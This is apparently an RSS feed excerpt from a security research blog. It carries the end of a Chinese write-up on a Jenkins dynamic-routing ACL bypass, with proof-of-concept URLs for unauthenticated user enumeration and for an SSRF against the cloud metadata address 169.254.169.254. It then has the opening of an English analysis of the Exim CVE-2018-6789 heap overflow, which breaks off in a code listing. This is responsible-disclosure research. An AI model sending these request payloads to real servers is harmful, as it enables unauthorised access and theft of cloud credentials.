&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ImmutableSet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ALWAYS_READABLE_PATHS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ImmutableSet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/login&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/logout&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/accessDenied&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/adjuncts/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/error&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/oops&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/signup&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/tcpSlaveAgentListener&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/federatedLoginService/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/securityRealm&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/instance-identity&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;這也代表著一開始可選的入口限制更嚴格選擇更少, 但如果能在一個白名單上的入口找到其他物件參考, 跳到非白名單上的成員豈不可以繞過前述的 URL 前綴限制? 可能有點難理解, 這裡先來一個簡單的範例來解釋 Jenkins 的動態路由機制:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkin.local/adjuncts/whatever/class/classLoader/resource/index.jsp/content
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;以上網址會依序執行下列方法&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;jenkins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Jenkins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAdjuncts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;whatever&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClassLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getResource&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;index.jsp&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getContent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;上面的執行鏈一個串一個雖然看起來很流暢, 但難過的是無法取得回傳內容, 因此嚴格來說不能算是一個風險, 但這個例子對於理解整個漏洞核心卻有很大的幫助!&lt;/p&gt;

&lt;p&gt;在了解原理後, 剩下的事就像是在解一個迷宮, 從 &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/jenkins/model/Jenkins.java&quot;&gt;jenkins.model.Jenkins&lt;/a&gt; 這個入口點開始, 物件中的每個成員又可以參考到一個新的物件, 接著要做的就是想辦法把中間錯綜複雜各種物件與物件間的關聯找出來, 一層一層的串下去直到迷宮出口 - 也就是危險的函數呼叫!&lt;/p&gt;

&lt;p&gt;值得一提的是, 這個漏洞最可惜的地方應該是無法針對 SETTER 進行操作, 不然的話應該就又是另外一個有趣的 &lt;a href=&quot;https://cwiki.apache.org/confluence/display/WW/S2-020&quot;&gt;Struts2 RCE&lt;/a&gt; 或是 &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1622&quot;&gt;Spring Framework RCE&lt;/a&gt; 了!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;如何利用&quot;&gt;如何利用&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;所以該如何利用這個漏洞呢? 簡單說, 這個漏洞所能做到的事情就只是透過物件間的參考去繞過 ACL 政策, 但在此之前我們必須先找到一個好的跳板好讓我們可以更方便的在物件中跳來跳去, 這裡我們選用了下面這個跳板:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/securityRealm/user/[username]/descriptorByName/[descriptor_name]/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;這個跳板會依序執行下面方法&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;jenkins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Jenkins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getSecurityRealm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getUser&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getDescriptorByName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;descriptor_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在 Jenkins 中可以被操作的物件都會繼承一個 &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/hudson/model/Descriptor.java&quot;&gt;hudson.model.Descriptor&lt;/a&gt; 類別, 而繼承這個類別的物件都可以透過 &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/hudson/model/DescriptorByNameOwner.java#L51&quot;&gt;hudson.model.DescriptorByNameOwner#getDescriptorByName(String)&lt;/a&gt; 去存取, 所以總體來說, 可透過這個跳板取得在 Jenkins 中約 500 個 Despicable 的物件類別!&lt;/p&gt;

&lt;p&gt;不過雖是如此, 由於 Jenkins 的設計模式, 大部分開發者在危險動作之前都會再做一次權限檢查, 所以即使可呼叫到 &lt;a href=&quot;http://jenkins.local/script&quot;&gt;Script Console&lt;/a&gt; 但在沒有 &lt;code class=&quot;highlighter-rouge&quot;&gt;Jenkins.RUN_SCRIPTS&lt;/code&gt; 權限的情況下也無法做任何事 :(&lt;/p&gt;

&lt;p&gt;但這個漏洞依然不失成為一個很好的膠水去繞過第一層的 ACL 限制串起其他的漏洞, 為後續的利用開啟了一道窗! 以下我們給出三個串出漏洞鏈的例子!&lt;br /&gt;
(雖然只介紹三種, 但由於這個漏洞玩法非常自由可串的絕不只如此, 推薦有興趣的同學可在尋找更多的漏洞鏈!)&lt;/p&gt;

&lt;p&gt;P.S. 值得注意的一點是, 在 &lt;code class=&quot;highlighter-rouge&quot;&gt;getUser([username])&lt;/code&gt; 的實現中會呼叫到 &lt;code class=&quot;highlighter-rouge&quot;&gt;getOrCreateById(...)&lt;/code&gt; 並且傳入 &lt;code class=&quot;highlighter-rouge&quot;&gt;create=True&lt;/code&gt; 導致在記憶體中創造出一個暫存使用者(會出現在使用者列表但無法進行登入操作), 雖然無用不過也被當成一個漏洞記錄在 &lt;a href=&quot;https://jenkins.io/security/advisory/2018-10-10/&quot;&gt;SECURITY-1128&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;1-免登入的使用者資訊洩漏&quot;&gt;1. 免登入的使用者資訊洩漏&lt;/h3&gt;

&lt;p&gt;在測試 Jenkins 時, 最怕的就是要進行字典檔攻擊時卻不知道該攻擊哪個帳號, 畢竟帳號永遠比密碼難猜! 這時這個漏洞就很好用了XD&lt;/p&gt;

&lt;p&gt;由於 Jenkins 對搜尋的功能並沒有加上適當的權限檢查, 因此在 &lt;code class=&quot;highlighter-rouge&quot;&gt;ANONYMOUS_READ=False&lt;/code&gt; 的狀況下可以透過修改 &lt;code class=&quot;highlighter-rouge&quot;&gt;keyword&lt;/code&gt; 參數從 a 到 z 去列舉出所有使用者!&lt;/p&gt;

&lt;h4 id=&quot;poc&quot;&gt;PoC:&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/securityRealm/user/admin/search/index?q=[keyword]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190116/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;除此之外也可搭配由 &lt;code class=&quot;highlighter-rouge&quot;&gt;Ananthapadmanabhan S R&lt;/code&gt; 所回報的 &lt;a href=&quot;https://jenkins.io/security/advisory/2017-10-11/#user-remote-api-disclosed-users-email-addresses&quot;&gt;SECURITY-514&lt;/a&gt; 進一步取得使用者信箱, 如:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/securityRealm/user/admin/api/xml
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;2-與-cve-2018-1000600-搭配成免登入且有完整回顯的-ssrf&quot;&gt;2. 與 CVE-2018-1000600 搭配成免登入且有完整回顯的 SSRF&lt;/h3&gt;

&lt;p&gt;下一個要串的漏洞則是 &lt;a href=&quot;https://jenkins.io/security/advisory/2018-06-25/#SECURITY-915&quot;&gt;CVE-2018-1000600&lt;/a&gt;, 這是一個由 &lt;a href=&quot;https://twitter.com/orange_8361&quot;&gt;Orange Tsai&lt;/a&gt;(對就是我XD) 所回報的漏洞, 關於這個漏洞官方的描述是:&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;CSRF vulnerability and missing permission checks in GitHub Plugin allowed capturing credentials&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;在已知 Credentials ID 的情形下可以洩漏任意 Jenkins 儲存的帳密, 但 Credentials ID 在沒指定的情況下會是一組隨機的 UUID 所以造成要利用這個漏洞似乎變得不太可能 (如果有人知道怎麼取得 Credentials ID 請告訴我!)&lt;/p&gt;

&lt;p&gt;雖然在不知道 Credentials ID 的情況下無法洩漏任何帳密, 但這個漏洞其實不只這樣, 還有另一個玩法! 關於這個漏洞最大的危害其實不是 CSRF, 而是 SSRF!&lt;/p&gt;

&lt;p&gt;不僅如此, 這個 SSRF 還是一個有回顯的 SSRF! 沒有回顯的 SSRF 要利用起來有多困難我想大家都知道 :P 因此一個有回顯的 SSRF 也就顯得何其珍貴!&lt;/p&gt;

&lt;h4 id=&quot;poc-1&quot;&gt;PoC:&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword
?apiUrl=http://169.254.169.254/%23
&amp;amp;login=orange
&amp;amp;password=tsai
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190116/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;3-未認證的遠端代碼執行&quot;&gt;3. 未認證的遠端代碼執行&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;所以廢話少說, RCE 在哪?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;為了最大程度的去利用這個漏洞, 我也挖了一個&lt;strong&gt;非常有趣&lt;/strong&gt;的 RCE 可以與這個漏洞搭配使用成為一個真正意義上不用認證的 RCE! 但由於這個漏洞目前還在 Responsible Disclosure 的時程內, 就請先期待 Hacking Jenkins Part 2 囉!&lt;br /&gt;
(預計二月中釋出!)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;todo&quot;&gt;TODO&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;這裡是一些我想繼續研究的方向, 可以讓這個漏洞變得更完美! 如果你發現了下面任何一個的解法請務必告訴我, 我會很感激的XD&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;在 &lt;code class=&quot;highlighter-rouge&quot;&gt;ANONYMOUS_READ=False&lt;/code&gt; 的權限下拿到 &lt;code class=&quot;highlighter-rouge&quot;&gt;Plugin&lt;/code&gt; 的物件參考, 如果拿到的可以繞過 &lt;a href=&quot;https://jenkins.io/security/advisory/2018-07-18/#SECURITY-914&quot;&gt;CVE-2018-1999002&lt;/a&gt; 與 &lt;a href=&quot;https://jenkins.io/security/advisory/2018-02-14/#SECURITY-705&quot;&gt;CVE-2018-6356&lt;/a&gt; 所需的最小權限限制, 成為一個真正意義上的免登入任意讀檔!&lt;/li&gt;
  &lt;li&gt;在 &lt;code class=&quot;highlighter-rouge&quot;&gt;ANONYMOUS_READ=False&lt;/code&gt; 的權限下找出另一組跳板去呼叫 &lt;code class=&quot;highlighter-rouge&quot;&gt;getDescriptorByName(String)&lt;/code&gt;. 為了修復 &lt;a href=&quot;https://jenkins.io/security/advisory/2018-08-15/#SECURITY-672&quot;&gt;SECURITY-672&lt;/a&gt;, Jenkins 從 2.138 開始對 &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/hudson/model/User.java&quot;&gt;hudson.model.User&lt;/a&gt; 增加判斷 &lt;code class=&quot;highlighter-rouge&quot;&gt;Jenkins.READ&lt;/code&gt; 的&lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/hudson/model/User.java#L1026&quot;&gt;檢查&lt;/a&gt;, 導致原有的跳板失效!&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;致謝&quot;&gt;致謝&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;最後, 感謝 Jenkins Security 團隊尤其是 Daniel Beck 的溝通協調與漏洞修復! 這裡是一個簡單的回報時間軸:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;May 30, 2018 - 回報漏洞給 Jenkins&lt;/li&gt;
  &lt;li&gt;Jun 15, 2018 - Jenkins 修補並分配 CVE-2018-1000600&lt;/li&gt;
  &lt;li&gt;Jul 18, 2018 - Jenkins 修補並分配 CVE-2018-1999002&lt;/li&gt;
  &lt;li&gt;Aug 15, 2018 - Jenkins 修復並分配 CVE-2018-1999046&lt;/li&gt;
  &lt;li&gt;Dec 05, 2018 - Jenkins 修補並分配 CVE-2018-1000861&lt;/li&gt;
  &lt;li&gt;Dec 20, 2018 - 回報 Groovy 漏洞給 Jenkins&lt;/li&gt;
  &lt;li&gt;Jan 08, 2019 - Jenkins 修復 Groovy 漏洞並分配 CVE-2019-1003000, CVE-2019-1003001, CVE-2019-1003002&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/</link>
                <guid>https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing</guid>
                <pubDate>Wed, 16 Jan 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Exim Off-by-one RCE: Exploiting CVE-2018-6789 with Fully Mitigations Bypassing</title>
                <description>&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
&lt;p&gt;We reported an overflow vulnerability in the base64 decode function of &lt;a href=&quot;https://www.exim.org/&quot;&gt;&lt;strong&gt;Exim&lt;/strong&gt;&lt;/a&gt; on 5 February, 2018, identified as &lt;a href=&quot;https://exim.org/static/doc/security/CVE-2018-6789.txt&quot;&gt;CVE-2018-6789&lt;/a&gt;. This bug exists since the first commit of exim, hence &lt;strong&gt;ALL versions&lt;/strong&gt; are affected. According to our research, it can be leveraged to gain &lt;strong&gt;Pre-auth Remote Code Execution&lt;/strong&gt; and at least 400k servers are at risk. Patched version 4.90.1 is already released and we suggest to upgrade exim immediately.&lt;/p&gt;

&lt;h2 id=&quot;affected&quot;&gt;Affected&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;All Exim versions below 4.90.1&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;one-byte-overflow-in-base64-decoding&quot;&gt;One byte overflow in base64 decoding&lt;/h1&gt;

&lt;h3 id=&quot;vulnerability-analysis&quot;&gt;Vulnerability Analysis&lt;/h3&gt;

&lt;p&gt;This is a calculation mistake of decode buffer length in &lt;code class=&quot;highlighter-rouge&quot;&gt;b64decode&lt;/code&gt; function:&lt;br /&gt;
&lt;a href=&quot;https://github.com/Exim/exim/blob/master/src/src/base64.c#L153&quot;&gt;base64.c: 153 b64decode&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;b64decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;store_get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Ustrlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// perform decoding&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As shown above, exim allocates a buffer of &lt;code class=&quot;highlighter-rouge&quot;&gt;3*(len/4)+1&lt;/code&gt; bytes to store decoded base64 data. However, when the input is not a valid base64 string and the length is &lt;code class=&quot;highlighter-rouge&quot;&gt;4n+3&lt;/code&gt;, exim allocates &lt;code class=&quot;highlighter-rouge&quot;&gt;3n+1&lt;/code&gt; but consumes &lt;code class=&quot;highlighter-rouge&quot;&gt;3n+2&lt;/code&gt; bytes while decoding. This causes one byte heap overflow (aka off-by-one).&lt;br /&gt;
Generally, this bug is harmless because the memory overwritten is usually unused. However, this byte overwrites some critical data when the string fits some specific length. In addition, this byte is controllable, which makes exploitation more feasible.&lt;br /&gt;
Base64 decoding is such a fundamental function and therefore this bug can be triggered easily, causing remote code execution.&lt;br /&gt;
&lt;a id=&quot;back&quot;&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h3&gt;
&lt;p&gt;To estimate the severity of this bug, we developed an exploit targeting SMTP daemon of exim. The exploitation mechanism used to achieve pre-auth remote code execution is described in the following paragraphs. In order to leverage this one byte overflow, it is necessary to trick memory management mechanism. It is highly recommended to have basic knowledge of heap exploitation &lt;a href=&quot;#heap_exp&quot;&gt;[ref]&lt;/a&gt; before reading this section.&lt;/p&gt;

&lt;p&gt;We developed the exploit with:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Debian(stretch)&lt;/strong&gt; and &lt;strong&gt;Ubuntu(zesty)&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;SMTP daemon of Exim4 package&lt;/strong&gt; installed with apt-get (4.89/4.88)&lt;/li&gt;
  &lt;li&gt;Config enabled (uncommented in default config) &lt;strong&gt;CRAM-MD5 authenticator&lt;/strong&gt; (any other authenticator using base64 also works)&lt;/li&gt;
  &lt;li&gt;Basic SMTP commands (&lt;strong&gt;EHLO, MAIL FROM/RCPT TO&lt;/strong&gt;) and &lt;strong&gt;AUTH&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;memory-allocation&quot;&gt;Memory allocation&lt;/h4&gt;

&lt;p&gt;First, we review the source code and search for useful memory allocation. As we mentioned in the &lt;a href=&quot;&quot;&gt;previous article&lt;/a&gt;, exim uses self-defined functions for dynamic allocation:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BOOL&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;store_extend_3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;cm&quot;&gt;/* The */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;store_free_3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;     &lt;span class=&quot;cm&quot;&gt;/* value of the */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;store_get_3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;         &lt;span class=&quot;cm&quot;&gt;/* 2nd arg is   */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;store_get_perm_3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;    &lt;span class=&quot;cm&quot;&gt;/* __FILE__ in  */&lt;/span&gt;
